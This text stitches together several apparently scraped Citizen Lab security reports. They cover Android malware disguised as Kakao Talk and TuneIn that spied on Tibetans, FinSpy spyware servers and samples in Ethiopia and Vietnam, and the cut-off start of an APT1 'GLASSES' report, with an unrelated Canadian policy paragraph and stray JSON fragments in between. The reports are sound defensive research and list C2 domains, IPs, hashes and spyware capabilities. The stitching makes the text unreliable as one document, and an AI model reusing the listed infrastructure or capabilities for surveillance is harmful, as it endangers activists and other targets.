SHA1withDSA\nVersion: 3\nThe following permissions are added by the malware and do not exist in the legitimate version:\nandroid.permission.GET_ACCOUNTS\nandroid.permission.ACCESS_NETWORK_STATE\nandroid.permission.READ_SMS\nandroid.permission.INTERNET\nandroid.permission.ACCESS_FINE_LOCATION\nandroid.permission.WRITE_SETTINGS\nandroid.permission.WRITE_SECURE_SETTINGS\nandroid.permission.WRITE_APN_SETTINGS\nandroid.permission.MOUNT_UNMOUNT_FILESYSTEMS\nandroid.permission.PROCESS_OUTGOING_CALLS\nandroid.permission.DEVICE_POWER\nadnroid.permission.ACCESS_CHECKIN_PROPERTTES\nandroid.permission.INTERNET\nadnroid.permission.CHANGE_WIFI_STATE\nandroid.permission.MODIFY_PHONE_STAT\nandroid.permission.BLUETOOTH_ADMIN\nandroid.permission.BLUETOOTH\nandroid.permission.BIND_DEVICE_ADMIN\nandroid.permission.USES_POLICY_FORCE_LOCK\nandroid.permission.CHANGE_CONFIGURATION\nFigure 2 below shows the difference in permissions between the legitimate and modified Kakao Talk software package. Users can display the permissions granted to an application by selecting ‘Apps’ from the settings menu. The sections highlighted in red show differences between the legitimate and illegitimate version of the application:\n\nFigure 2: Comparison of permissions between legitimate and illegitimate versions of Kakao Talk.\nUsing these permissions, the malware performs the following actions of significant concern:\n\nOn a periodic basis the user’s contacts, call history, SMS messages and cellular network configuration are written to an encrypted file called info.txt.\nPeriodically contacts a command and control server (C2)  “android.uyghur.dnsd.me” to retrieve updated configuration information such as URLs and login credentials. This configuration information directs the malware where to upload the info.txt file. The site hosting the C2 appears to emulate the appearance of the Baidu website (a Chinese search engine), but includes encrypted configuration data hidden in the comments. By masking the C2 as a seemingly innocuous website, requests would appear to be legitimate on casual inspection. The configuration data contained in the comments direct the malware to upload captured data from the device to an FTP server and contain a pointer to a new C2 that would allow the attackers to change the C2 should that need arise.\nIntercepts SMS messages and searches for a special code sent by a malicious actor, which if detected responds to the sender with the base station ID, tower ID, mobile network code and mobile area code of the phone in question. This message is not displayed to the user and they are never made aware of it.\n\nThe fact that the malware silently responds to the SMS with such detailed technical information on the cellular phone network and topology is both troubling and curious.\nAn unsophisticated actor would have little or no use for this information if they were simply interested in exfiltrating data from the user for purposes such as fraud, spam or identity theft. Nor can this information be easily used to place a person’s physical location — the malware is not responding with a convenient longitude and latitude. Detailed knowledge of the cellular network topology and configuration would be required to determine a user’s location, something unlikely to be in such an actor’s possession.\nThis information is only useful to actors with access to the cellular communications provider and its technical infrastructure, such as large businesses and government. It almost certainly represents the information that a cellular service provider requires to initiate eavesdropping, often referred to as “trap & trace.” Actors at this level would also have access to the data required to perform radio frequency triangulation based on the signal data from multiple towers, placing the user within a small geographical area.\nHowever, it is also possible that this data is being gathered opportunistically by an actor without access to such cellular network information. We can only speculate on what may be done with the data that is collected.\nOf the additional permissions requested by the malware, some do not appear to be used, including GPS location, Bluetooth radio access, and phone sleep state. While these features are not currently being utilized, exploiting them could have serious consequences.  For instance, Bluetooth functionality could potentially be used to enumerate devices (and through this other individuals) in close proximity to the compromised phone. The fact that these features are not currently utilized may indicate that the malware is still undergoing development.\nFurther evidence suggests that the malware may be in the process of development. Two of the additional permissions requested by the malware are misspelled, rendering these permissions unusable:\nadnroid.permission.ACCESS_CHECKIN_PROPERTTES\nadnroid.permission.CHANGE_WIFI_STATE\nWe ran three popular mobile antivirus scanners (provided by Avast, Lookout, and Kaspersky) on an Android handset with the compromised application installed. As seen in Figure 3, none of the three scanners detected the applications as malicious on two separate days of testing: February 6, 2013 and March 27, 2013. Therefore, at this time manual inspection of the applications permissions is required to detect the compromised application.\n\nFigure 3: Screen captures of three mobile malware scanning applications (from left to right, Avast, Lookout and Kaspersky) failing to detect the compromised version of Kakao Talk.\nThe identifiers for the sample are listed below and further information is available on VirusTotal.\n\n\n\nMD5\ncbc474e34f26b4afd02932d8cae9e401\n\n\nSHA-1\n495b622d8209820022fe743c340b39e6e9313cd9\n\n\nSHA-256\n9390a145806157cadc54ecd69d4ededc31534a19a1cebbb1824a9eb4febdc56d\n\n\n\nContextual Analysis\nWhile groups advocating for Tibetan rights have been the targets of persistent malware campaigns for many years, this attack stands out for a number of reasons. First, it targets a prominent member of the Tibetan community and leverages legitimate emails that attempt to encourage the use of alternatives to applications with security issues like WeChat when communicating with individuals in the Tibetan community. WeChat has been rapidly gaining popularity amongst Tibetans, including those in exile communities and individuals communicating sensitive information inside Tibetan areas.\nIn addition, the discovery of this malware comes at a particularly sensitive time for Tibetans and those working on issues related to Tibetan human rights. The wave of self-immolations amongst Tibetans has led to an increasingly severe response from Chinese authorities. The practice of self-immolation among Tibetans has intensified significantly since Citizen Lab first examined information controls in Tibet in the wake of self-immolations over a year ago. As of April 1, 2013, 112 Tibetans have self-immolated. The Chinese government’s response to such practice has become increasingly hardline, with officials explicitly characterizing measures employed to maintain stability in Tibetan regions as a “crackdown” in March 2013. This hardening policy is perhaps an indication of the government’s view of the severity of the threat to its control presented by events in Tibet.\nThe government and official media have characterized the underlying causes of self-immolation differently over time, gradually moving to the position that the practice is the result of the influence of “foreign hostile forces,” coordinated and encouraged by overseas Tibetan organizations as well as the Dalai Lama. The crackdown in Tibet against self-immolators and those who are alleged to incite them has already resulted in severe criminal sentences for some individuals, based in part on “evidence” of their digital contact with overseas groups.\nWith official reliance on “evidence” of overseas contact as a basis for conviction and crackdown, it appears that Chinese authorities are specifically targeting mobile devices in China as a perceived means of communicating and organizing self-immolations. In March 2013, reports emerged from Lhasa that Chinese authorities had introduced restrictions against the use of mobile phones and had conducted a security sweep of mobile devices in the city’s monasteries in an attempt to limit the dissemination of images and text.  Although we have no specific evidence linking these new restrictions to the targeted malware we found, the timing is certainly suggestive and warrants further exploration.\nConclusion and Recommendations \nThis incident demonstrates the capacity of attackers to rapidly adapt their techniques in response to changes in the communication methods used by targeted communities. In this case, Tibetan community members began discussing alternative applications to WeChat following concerns raised about its security. In a tit-for-tat response, attackers quickly leveraged this change, duplicating a legitimate message and producing a malicious version of an application being circulated as a possible alternative.\nThe malicious APKs linked to the Luckycat campaign [PDF], the recent Android malware attacks reported by Kaspersky and the example presented here demonstrate that the Tibetan community is being actively targeted by mobile malware.\nThe attack we analyzed and the malware reported by Kaspersky are not technically related. The malware binaries and command and control infrastructure are different and there is no clear indication from technical comparison of the two samples that the attacks were conducted by the same attacker(s). However, both attacks leveraged compromised email accounts of high profile members of the Tibetan community and also included reference to the Uyghur community (in the email lure of the sample reported by Kaspersky, and in the actual sender email “uygur52@gmx.com” and C2 domain “android.uyghur.dnsd.me” used in the attack we analyzed). Notably, authorities in China have also targeted use of the “‘Internet, mobile phones and digital storage devices’” by Uyghurs in the government’s campaign against the “three evils” of terrorism, separatism and extremism. These similarities are inconclusive, but suggest that mobile malware campaigns against these communities are likely to continue.\nThese examples demonstrate the risks communities face from targeted mobile malware. Attackers will continue to adopt new methods and widen targeting of platforms. For communities under persistent threat from targeted malware campaigns, user vigilance and education are essential for reducing risk.\nThe Citizen Lab recommends:\n\nThat users exercise caution in opening unexpected or unsolicited attachments or opening unverified links. See Citizen Lab’s Recommendations for defending against targeted cyber threats for additional information, and Tibet Action Institute’s Detach from Attachments campaign.\nThat users be aware of mobile malware and exercise caution when installing mobile applications. Users should pay close attention to the permissions requested by the malware, and should avoid installing applications that request permissions they do not need. The Guardian Project and other initiatives are developing secure mobile applications to help users protect their communications and personal data from intrusion and monitoring.\nThat users consult the Tibet Action Institute’s Mobile Security resources, which are aimed at Tibetan audiences.\n\n\n\nUpdate (18 April 2013)\nThis update is also available in Tibetan language.\nFurther to our blog post of April 1, 2013, “Permission to Spy: An Analysis Of Android Malware Targeting Tibetans” (see above), additional malware was found to be circulating in tandem with the Kakao Talk APK. The additional malware is a compromised version of the TuneIn media player application, nominally available from the website/company http://www.tunein.com but available as an APK from multiple sources.\nAs detailed in “Permission to Spy,” on December 4, 2012, an information security expert who works within the Tibetan community sent a private email to a member of the Tibetan parliament-in-exile, based in Dharamsala, India. That email attached a genuine version of both Kakao Talk and TuneIn as .apk files. On January 16, 2013, an email purporting to be from this same information security expert was sent to a high profile political figure in the Tibetan community. That email contained the same text and what appeared to be the same attachments as the message from December 4, but, as documented in the prior post, included a compromised version of the Kakao Talk Android APK instead of the original file.\nWe have now determined that, in addition to the compromised Kakao Talk APK, the TuneIn APK file attached to the January 16 spoofed email was also compromised. The malware found to be present in the TuneIn APK is functionally identical to the malware found in the Kakao Talk APK. The fake certificates used to sign both the compromised TuneIn Radio and Kakao Talk APKs are identical in every respect.\nTuneIn is a media player application for listening to Internet Radio. TuneIn is used by Tibetans to listen to streams such as the Voice of America Tibetan service, to engage with their culture, and to stay on top of world news. It also streams a wide variety of content, is well reviewed and is popular on the Google Play store. All of these features make the application an attractive target for compromise.\nSimilar to the compromised Kakao Talk APK, the malicious TuneIn Radio APK adds permissions that allow attackers to collect user’s contacts, SMS message history and cellular network location.\nSince publication of our “Permission to Spy” report, 5/42 anti virus scanners tested on VirusTotal detect the Kakako APK as malicious.\nThe identifiers for the TuneIn sample are listed below and further information is available on VirusTotal.\n\n\n\nMD5\nba760392f171e2f05d0352cc1e00190c\n\n\nSHA-1\n015ea52dba3b0e13d1acb4c1f2904b90eca2312c\n\n\nSHA-256\ne769fdf8f2e1a5311ef089c422a7c0cb360d77082d7d1ef1ff39a95c9321ec40\n\n\n\nHow to Check if TuneIn is Compromised\nIf you have TuneIn Radio already installed on your phone and want to check if it is the real application and not malware do the following steps:\nStep 1. Go to ‘Settings’\nStep 2. Go to ‘Apps’\nStep 3: Swipe to ‘All’\nStep 4. Find TuneIn Radio and press the icon to display permissions\nStep 5: Compare the permissions displayed on your phone with the image below\n(Note that different versions of Android may have different menu configurations, so the above steps may need to be adjusted accordingly).\nIf you are installing TuneIn Radio from an APK, the permissions requested will be displayed so use the image below to compare to ensure that you are using a legitimate version of the application:\n\nA side by side comparison of the permissions of a legitimate TuneIn binary and the malicious modified binary.\nAcknowledgements: This report is by the Citizen Lab Targeted Threats team.

But is the country prepared to protect itself and what will this protection look like?\nIn a report published by The School of Public Policy at the University of Calgary, professor Ron Deibert argues that Canada has potential to be a global leader in cyber security, but this opportunity is being squandered because of the lack of a clear strategy in this area.  “Canada should be forging a leading position in global cyberspace governance and security,” Deibert writes. “We certainly stand among those with the most to lose should cyberspace continue its spiral into censorship, securitization, militarization, and crime.”\nTo read the full report, see here. \n\n\t\t\t\t\n\t\t\t",

Additionally, it provides examination of a FinSpy Mobile sample found in the wild, which appears to have been used in Vietnam.\nSummary of Key Findings\n\nWe have found command and control servers for FinSpy backdoors, part of Gamma International’s FinFisher “remote monitoring solution,” in a total of 25 countries: Australia, Bahrain, Bangladesh, Brunei, Canada, Czech Republic, Estonia, Ethiopia, Germany, India, Indonesia, Japan, Latvia, Malaysia, Mexico, Mongolia, Netherlands, Qatar, Serbia, Singapore, Turkmenistan, United Arab Emirates, United Kingdom, United States, Vietnam.\n\n\nA FinSpy campaign in Ethiopia uses pictures of Ginbot 7, an Ethiopian opposition group, as bait to infect users. This continues the theme of FinSpy deployments with strong indications of politically-motivated targeting.\n\n\nThere is strong evidence of a Vietnamese FinSpy Mobile Campaign. We found an Android FinSpy Mobile sample in the wild with a command & control server in Vietnam that also exfiltrates text messages to a local phone number.\n\n\nThese findings call into question claims by Gamma International that previously reported servers were not part of their product line, and that previously discovered copies of their software were either stolen or demo copies.\n\n1. Background and Introduction\nFinFisher is a line of remote intrusion and surveillance software developed by Munich-based Gamma International GmbH. FinFisher products are marketed and sold exclusively to law enforcement and intelligence agencies by the UK-based Gamma Group.1 Although touted as a “lawful interception” suite for monitoring criminals, FinFisher has gained notoriety because it has been used in targeted attacks against human rights campaigners and opposition activists in countries with questionable human rights records.2\nIn late July 2012, we published the results of an investigation into a suspicious e-mail campaign targeting Bahraini activists.3 We analyzed the attachments and discovered that they contained the FinSpy spyware, FinFisher’s remote monitoring product. FinSpy captures information from an infected computer, such as passwords and Skype calls, and sends the information to a FinSpy command & control (C2) server. The attachments we analyzed sent data to a command & control server inside Bahrain.\nThis discovery motivated researchers to search for other command & control servers to understand how widely FinFisher might be used. Claudio Guarnieri at Rapid7 (one of the authors of this report) was the first to search for these servers. He fingerprinted the Bahrain server and looked at historical Internet scanning data to identify other servers around the world that responded to the same fingerprint. Rapid7 published this list of servers, and described their fingerprinting technique. Other groups, including CrowdStrike and SpiderLabs also analyzed and published reports on FinSpy.\nImmediately after publication, the servers were apparently updated to evade detection by the Rapid7 fingerprint. We devised a different fingerprinting technique and scanned portions of the internet. We confirmed Rapid7’s results, and also found several new servers, including one inside Turkmenistan’s Ministry of Communications. We published our list of servers in late August 2012, in addition to an analysis of mobile phone versions of FinSpy. FinSpy servers were apparently updated again in October 2012 to disable this newer fingerprinting technique, although it was never publicly described.\nNevertheless, via analysis of existing samples and observation of command & control servers, we managed to enumerate yet more fingerprinting methods and continue our survey of the internet for this surveillance software. We describe the results in this post.\nCivil society groups have found cause for concern in these findings, as they indicate the use of FinFisher products by countries like Turkmenistan and Bahrain with problematic records on human rights, transparency, and rule of law. In an August 2012 response to a letter from UK-based NGO Privacy International, the UK Government revealed that at some unspecified time in the past, it had examined a version of FinSpy, and communicated to Gamma that a license would be required to export that version outside of the EU. Gamma has repeatedly denied links to spyware and servers uncovered by our research, claiming that the servers detected by our scans are “not … from the FinFisher product line.”4 Gamma also claims that the spyware sent to activists in Bahrain was an “old” demonstration version of FinSpy, stolen during a product presentation.\nIn February 2013, Privacy International, the European Centre for Constitutional and Human Rights (ECCHR), the Bahrain Center for Human Rights, Bahrain Watch, and Reporters Without Borders filed a complaint with the Organization for Economic Cooperation and Development (OECD), requesting that this body investigate whether Gamma violated OECD Guidelines for Multinational Enterprises by exporting FinSpy to Bahrain. The complaint called previous Gamma statements into question, noting that at least two different versions (4.00 and 4.01) of FinSpy were found in Bahrain, and that Bahrain’s server was a FinFisher product and was likely receiving updates from Gamma. This complaint, as laid out by Privacy International states that Gamma:\n\n\nfailed to respect the internationally recognised human rights of those affected by [its] activities\ncaused and contributed to adverse human rights impacts in the course of [its] business activities\nfailed to prevent and mitigate adverse human rights impacts linked to [its] activities and products, and failed to address such impacts where they have occurred\nfailed to carry out adequate due diligence (including human rights due diligence); and\nfailed to implement a policy commitment to respect human rights.\n\n\nAccording to recent reporting, German Federal Police appear to have plans to purchase and use the FinFisher suite of tools domestically within Germany.5 Meanwhile, findings by our group and others continue to illustrate the global proliferation of FinFisher’s products. Research continues to uncover troubling cases of FinSpy in countries with dismal human rights track records, and politically repressive regimes. Most recently, work by Bahrain Watch has confirmed the presence of a Bahraini FinFisher campaign, and further contradicted Gamma’s public statements. This post adds to the list by providing an updated list of FinSpy Command & Control servers, and describing the FinSpy malware samples in the wild which appear to have been used to target victims in Ethiopia and Vietnam.\nWe present these updated findings in the hopes that we will further encourage civil society groups and competent investigative bodies to continue their scrutiny of Gamma’s activities, relevant export control issues, and the issue of the global and unregulated proliferation of surveillance malware.\n2. FinFisher: Updated Global Scan\n(click image to enlarge)\n\nFigure 1. Map of global FinFisher proliferation\nAround October 2012, we observed that the behavior of FinSpy servers began to change. Servers stopped responding to our fingerprint, which had exploited a quirk in the distinctive FinSpy wire protocol. We believe that this indicates that Gamma either independently changed the FinSpy protocol, or was able to determine key elements of our fingerprint, although it has never been publicly revealed.\nIn the wake of this apparent update to FinSpy command & control servers, we devised a new fingerprint and conducted a scan of the internet for FinSpy command & control servers. This scan took roughly two months and involved sending more than 12 billion packets. Our new scan identified a total of 36 FinSpy servers, 30 of which were new and 6 of which we had found during previous scanning. The servers operated in 19 different countries. Among the FinSpy servers we found, 7 were in countries we hadn’t seen before.\n\nNew Countries\nCanada, Bangladesh, India, Malaysia, Mexico, Serbia, Vietnam\n\nIn our most recent scan, 16 servers that we had previously found did not show up. We suspect that after our earlier scans were published the operators moved them. Many of these servers were shut down or relocated after the publication of previous results, but before the apparent October 2012 update. We no longer found FinSpy servers in 4 countries where previous scanning identified them (Brunei, UAE, Latvia, and Mongolia). Taken together, FinSpy servers are currently, or have been present, in 25 countries.\nAustralia, Bahrain, Bangladesh, Brunei, Canada, Czech Republic, Estonia, Ethiopia, Germany, India, Indonesia, Japan, Latvia, Malaysia, Mexico, Mongolia, Netherlands, Qatar, Serbia, Singapore, Turkmenistan, United Arab Emirates, United Kingdom, United States, Vietnam.\nImportantly, we believe that our list of servers is incomplete due to the large diversity of ports used by FinSpy servers, as well as other efforts at concealment. Moreover, discovery of a FinSpy command and control server in a given country is not a sufficient indicator to conclude the use of FinFisher by that country’s law enforcement or intelligence agencies. In some cases, servers were found running on facilities provided by commercial hosting providers that could have been purchased by actors from any country.\nThe table below shows the FinSpy servers detected in our latest scan. We list the full IP address of servers that have been previously publicly revealed. For active servers that have not been publicly revealed, we list the first two octets only. Releasing complete IP addresses in the past has not proved useful, as the servers are quickly shut down and relocated.*\n\n\n\nIP\nOperator\nRouted to Country\n\n\n117.121.xxx.xxx\nGPLHost\nAustralia\n\n\n77.69.181.162\nBatelco ADSL Service\nBahrain\n\n\n180.211.xxx.xxx\nTelegraph & Telephone Board\nBangladesh\n\n\n168.144.xxx.xxx\nSoftcom, Inc.\nCanada\n\n\n168.144.xxx.xxx\nSoftcom, Inc.\nCanada\n\n\n217.16.xxx.xxx\nPIPNI VPS\nCzech Republic\n\n\n217.146.xxx.xxx\nZone Media UVS/Nodes\nEstonia\n\n\n213.55.99.74\nEthio Telecom\nEthiopia\n\n\n80.156.xxx.xxx\nGamma International GmbH\nGermany\n\n\n37.200.xxx.xxx\nJiffyBox Servers\nGermany\n\n\n178.77.xxx.xxx\nHostEurope GmbH\nGermany\n\n\n119.18.xxx.xxx\nHostGator\nIndia\n\n\n119.18.xxx.xxx\nHostGator\nIndia\n\n\n118.97.xxx.xxx\nPT Telkom\nIndonesia\n\n\n118.97.xxx.xxx\nPT Telkom\nIndonesia\n\n\n103.28.xxx.xxx\nPT Matrixnet Global\nIndonesia\n\n\n112.78.143.34\nBiznet ISP\nIndonesia\n\n\n112.78.143.26\nBiznet ISP\nIndonesia\n\n\n117.121.xxx.xxx\nGPLHost\nMalaysia\n\n\n187.188.xxx.xxx\nIusacell PCS\nMexico\n\n\n201.122.xxx.xxx\nUniNet\nMexico\n\n\n164.138.xxx.xxx\nTilaa\nNetherlands\n\n\n164.138.28.2\nTilaa\nNetherlands\n\n\n78.100.57.165\nQtel – Government Relations\nQatar\n\n\n195.178.xxx.xxx\nTri.d.o.o / Telekom Srbija\nSerbia\n\n\n117.121.xxx.xxx\nGPLHost\nSingapore\n\n\n217.174.229.82\nMinistry of Communications\nTurkmenistan\n\n\n72.22.xxx.xxx\niPower, Inc.\nUnited States\n\n\n166.143.xxx.xxx\nVerizon Wireless\nUnited States\n\n\n117.121.xxx.xxx\nGPLHost\nUnited States\n\n\n117.121.xxx.xxx\nGPLHost\nUnited States\n\n\n117.121.xxx.xxx\nGPLHost\nUnited States\n\n\n117.121.xxx.xxx\nGPLHost\nUnited States\n\n\n183.91.xxx.xxx\nCMC Telecom Infrastructure Company\nVietnam\n\n\n\nSeveral of these findings are especially noteworthy:\n\nEight servers are hosted by provider GPLHost in various countries (Singapore, Malaysia, Australia, US). However, we observed only six of these servers active at any given time, suggesting that some IP addresses may have changed during our scans.\nA server identified in Germany has the registrant “Gamma International GmbH,” and the contact person is listed as “Martin Muench.”\nThere is a FinSpy server in an IP range registered to “Verizon Wireless.” Verizon Wireless sells ranges of IP addresses to corporate customers, so this is not necessarily an indication that Verizon Wireless itself is operating the server, or that Verizon Wireless customers are being spied on.\nA server in Qatar that was previously detected by Rapid7 seems to be back online after being unresponsive during the last round of our scanning. The server is located in a range of 16 addresses registered to “Qtel – Corporate accounts – Government Relations.” The same block of 16 addresses also contains the website http://qhotels.gov.qa/.\n\n3. Ethiopia and Vietnam: In-depth Discussion of New Samples\n3.1 FinSpy in Ethiopia\nWe analyzed a recently acquired malware sample and identified it as FinSpy. The malware uses images of members of the Ethiopian opposition group,  Ginbot 7, as bait. The malware communicates with a FinSpy Command & Control server in Ethiopia, which was first identified by Rapid7 in August 2012. The server has been detected in every round of scanning, and remains operational at the time of this writing. It can be found in the following address block run by Ethio Telecom, Ethiopia’s state-owned telecommunications provider:\nIP: 213.55.99.74\nroute: 213.55.99.0/24\ndescr: Ethio Telecom\norigin: AS24757\nmnt-by: ETC-MNT\nmember-of: rs-ethiotelecom\nsource: RIPE # Filtered\nThe server appears to be updated in a manner consistent with other servers, including servers in Bahrain and Turkmenistan.\n\n\n\nMD5\n8ae2febe04102450fdbc26a38037c82b\n\n\nSHA-1\n1fd0a268086f8d13c6a3262d41cce13470886b09\n\n\nSHA-256\nff6f0bcdb02a9a1c10da14a0844ed6ec6a68c13c04b4c122afc559d606762fa\n\n\n\nThe sample is similar to a previously analyzed sample of FinSpy malware sent to activists in Bahrain in 2012. Just like Bahraini samples, the malware relocates itself and drops a JPG image with the same filename as the sample when executed by an unsuspecting user. This appears to be an attempt to trick the victim into believing the opened file is not malicious. Here are a few key similarities between the samples:\n\nThe PE timestamp “2011-07-05 08:25:31” of the packer is exactly the same as the Bahraini sample.\nThe following string (found in a process infected with the malware), self-identifies the malware and is similar to strings found in the Bahraini samples:\n\nThe samples share the same Bootkit, SHA-256: ba21e452ee5ff3478f21b293a134b30ebf6b7f4ec03f8c8153202a740d7978b2.\nThe samples share the same driverw.sys file, SHA-256: 62bde3bac3782d36f9f2e56db097a4672e70463e11971fad5de060b191efb196.\n\n\nFigure 2. The image shown to the victim contains pictures of members of the Ginbot 7 Ethiopian opposition group\nIn this case the picture contains photos of members of the Ethiopian opposition group,  Ginbot 7. Controversially, Ginbot 7 was designated a terrorist group by the Ethiopian Government in 2011. The Committee to Protect Journalists (CPJ) and Human Rights Watch have both criticized this action, CPJ has pointed out that it is having a chilling effect on legitimate political reporting about the group and its leadership.\nThe existence of a FinSpy sample that contains Ethiopia-specific imagery, and that communicates with a still-active command & control server in Ethiopia strongly suggests that the Ethiopian Government is using FinSpy.\n3.2 FinSpy Mobile in Vietnam\nWe recently obtained and analyzed a malware sample6 and identified it as FinSpy Mobile for Android. The sample communicates with a command & control server in Vietnam, and exfiltrates text messages to a Vietnamese telephone number.\nThe FinFisher suite includes mobile phone versions of FinSpy for all major platforms including iOS, Android, Windows Mobile, Symbian and Blackberry. Its features are broadly similar to the PC version of FinSpy identified in Bahrain, but it also contains mobile-specific features such as GPS tracking and functionality for silent ‘spy’ calls to snoop on conversations near the phone. An in-depth analysis of the FinSpy Mobile suite of backdoors was provided in an earlier blog post: The Smartphone Who Loved Me: FinFisher Goes Mobile?\n\n\n\nMD5\n573ef0b7ff1dab2c3f785ee46c51a54f\n\n\nSHA-1\nd58d4f6ad3235610bafba677b762f3872b0f67cb\n\n\nSHA-256\n363172a2f2b228c7b00b614178e4ffa00a3a124200ceef4e6d7edb25a4696345\n\n\n\nThe sample included a configuration file7 that indicates available functionality, and the options that have been enabled by those deploying it:\n\nFigure 3. Image of a section of a configuration file for the FinSpy Mobile sample\nInterestingly, the configuration file also specifies a Vietnamese phone number used for SMS based command and control:\nSection Type: TlvTypeConfigSMSPhoneNumber\nSection Data: “+841257725403”\nThe command and control server is in a range provided by the CMC Telecom Infrastructure Company in Hanoi:\nIP Address: 183.91.2.199\ninetnum: 183.91.0.0 – 183.91.9.255\nnetname: FTTX-NET\ncountry: Vietnam\naddress: CMC Telecom Infrastructure Company\naddress: Tang 3, 16 Lieu Giai str, Ba Dinh, Ha Noi\nThis server was active until very recently and matched our signatures for a FinSpy command and control server. Both the command & control server IP and the phone number used for text-message exfiltration are in Vietnam which indicates a domestic campaign.\nThis apparent FinSpy deployment in Vietnam is troubling in the context of recent threats against online free expression and activism. In 2012, Vietnam introduced new censorship laws amidst an ongoing harassment, intimidation, and detention campaign against of bloggers who spoke out against the regime. This culminated in the trial of 17 bloggers, 14 of whom were recently convicted and sentenced to terms ranging from 3 to 13 years.8\n4. Brief Discussion of Findings\nCompanies selling surveillance and intrusion software commonly claim that their tools are only used to track criminals and terrorists. FinFisher, VUPEN and Hacking Team have all used similar language.9 Yet a growing body of evidence suggests that these tools are regularly obtained by countries where dissenting political activity and speech is criminalized. Our findings highlight the increasing dissonance between Gamma’s public claims that FinSpy is used exclusively to track “bad guys” and the growing body of evidence suggesting that the tool has and continues to be used against opposition groups and human rights activists.\nWhile our work highlights the human rights ramifications of the mis-use of this technology, it is clear that there are broader concerns.  A global and unregulated market for offensive digital tools potentially presents a novel risk to both national and corporate cyber-security. On March 12th, US Director of National Intelligence James Clapper stated in his yearly congressional report on security threats:\n“…companies develop and sell professional-quality technologies to support cyberoperations–often branding these tools as lawful-intercept or defensive security research products. Foreign governments already use some of these tools to target U.S. systems.”\nThe unchecked global proliferation of products like FinFisher makes a strong case for policy debate about surveillance software and the commercialization of offensive cyber-capabilities.\nOur latest findings give an updated look at the global proliferation of FinSpy. We identified 36 active FinSpy command & control servers, including 30 previously-unknown servers. Our list of servers is likely incomplete, as some FinSpy servers employ countermeasures to prevent detection. Including servers discovered last year, we now count FinSpy servers in 25 countries, including countries with troubling human rights records. This is indicative of a global trend towards the acquisition of offensive cyber-capabilities by non-democratic regimes from commercial Western companies.\nThe Vietnamese and Ethiopian FinSpy samples we identified warrant further investigation, especially given the poor human rights records of these countries. The fact that the Ethiopian version of FinSpy uses images of opposition members as bait suggests it may be used for politically influenced surveillance activities, rather than strictly law enforcement purposes.\nThe Ethiopian sample is the second FinSpy sample we have discovered that communicates with a server we identified by scanning as a FinSpy command & control server. This further validates our scanning results, and calls into question Gamma’s claim that such servers are “not … from the FinFisher product line.”10 Similarities between the Ethiopian sample and those used to target Bahraini activists also bring into question Gamma International’s earlier claims that the Bahrain samples were stolen demonstration copies.\nWhile the sale of such intrusion and surveillance software is largely unregulated, the issue has drawn increased high-level scrutiny. In September of last year, the German foreign minister, Guido Westerwelle, called for an EU-wide ban on the export of such surveillance software to totalitarian states.11 In a December 2012 interview, Marietje Schaake (MEP), currently the rapporteur for the first EU strategy on digital freedom in foreign policy, stated that it was “quite shocking” that Europe companies continue to export repressive technologies to countries where the rule of law is in question.12\nWe urge civil society groups and journalists to follow up on our findings within affected countries. We also hope that our findings will provide valuable information to the ongoing technology and policy debate about surveillance software and the commercialisation of offensive cyber-capabilities.\nCorrections (15 March 2013):\n* The table of FinFisher server IP addresses has been revised since the original publication. Due to an issue during formatting, Ethio Telecom was incorrectly identified as being in Estonia rather than in Ethiopia and Iusacell PCS was incorrectly identified as being in Malaysia rather than in Mexico. The IP range 117.121.xxx.xxx corresponds with GPLHost, which is located in Malaysia.  Iusacell PCS corresponds with 187.188.xxx.xxx and is located in Mexico.\nAcknowledgements\nWe’d like to thank Eva Galperin and the Electronic Frontier Foundation (EFF), Privacy International, Bahrain Watch, and Drew Hintz.\nMedia Coverage\nMedia coverage of the report includes HuffingtonPost Canada, Salon, The Verge, Bloomberg Business Week, TheYoungTurks, The New York Times, Washington Post, AP, CIO, Slate, CBC, Netzpolitik (in German), NDR (in German), The Malysian Insider and The Diplomat.\nFootnotes\n1https://www.gammagroup.com/\n2Software Meant to Fight Crime Is Used to Spy on Dissidents, http://goo.gl/GDRMe, New York Times, August 31, 2012, Page A1 Print edition.\n3Cyber Attacks on Activists Traced to FinFisher Spyware of Gamma, http://goo.gl/nJH7o, Bloomberg, July 25, 2012\n4http://bits.blogs.nytimes.com/2012/08/16/company-denies-role-in-recently-uncovered-spyware/\n5http://www.sueddeutsche.de/digital/finfisher-entwickler-gamma-spam-vom-staat-1.1595253\n6This sample has also been discussed by Denis Maslennikov from Kasperksy in his analyses of FinSpy Mobile – https://www.securelist.com/en/analysis/204792283/Mobile_Malware_Evolution_Part_6\n7Configuration parsed with a tool written by Josh Grunzweig of Spider Labs – http://blog.spiderlabs.com/2012/09/finspy-mobile-configuration-and-insight.html\n8https://www.eff.org/deeplinks/2013/01/bloggers-trial-vietnam-are-part-ongoing-crackdown-free-expression\n9https://www.securityweek.com/podcast-vupen-ceo-chaouki-bekrar-addresses-zero-day-marketplace-controversy-cansecwest\n10http://bits.blogs.nytimes.com/2012/08/16/company-denies-role-in-recently-uncovered-spyware/\n11http://www.guardian.co.uk/uk/2012/nov/28/offshore-company-directors-military-intelligence\n12http://www.vieuws.eu/foreign-affairs/digital-freedoms-marietje-schaake-mep-alde/\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload PDF version\nKey Findings\n\nMalware (“GLASSES”) sent in 2010 is a simple downloader that is closely related to the GOGGLES malware described by Mandiant in their APT1 report.\nGLASSES was sent in a highly targeted email to a Tibetan human rights organization, demonstrating that APT1 is involved in more than just industrial and corporate espionage, with attacks against civil society actors documented as early as almost three years ago.\nThe methods and infrastructure of this attack are consistent with those described in Mandiant’s APT1 report, e.g., spear phishing against an English-speaking target, having an infrastructure of compromised machines for malware distribution and C2 operation.\nThe GLASSES sample analyzed shares a large percentage of code and an operational C2 server with a GOGGLES sample, indicating that they are from the same source.\nThe GOGGLES sample we discovered that communicates to the shared C2 server is not exactly the same as described in the Mandiant report, indicating that GLASSES may be a variant of GOGGLES, and that the software has been used while under active development.\n\nOverview\nOn February 19, 2013, Mandiant released a report titled “APT1: Exposing One of China’s Cyber Espionage Units.” [Offsite-PDF] The report describes the activities of one cyber espionage group, APT1 (referred to as “Comment Crew” or “Byzantine Candor” in other reports), that has targeted a large number of organizations in a wide range of industries, stealing terabytes of data. Mandiant traced APT1 operations to China and makes the case that the group may in fact be the 2nd Bureau of the People’s Liberation Army (PLA) General Staff Department’s 3rd Department, also known as Unit 61398.\nIn early 2011, Citizen Lab was forwarded a malicious email containing a link to a malware sample for analysis, as part of our ongoing study of targeted cyber threats against human rights organizations. This email, sent almost a year 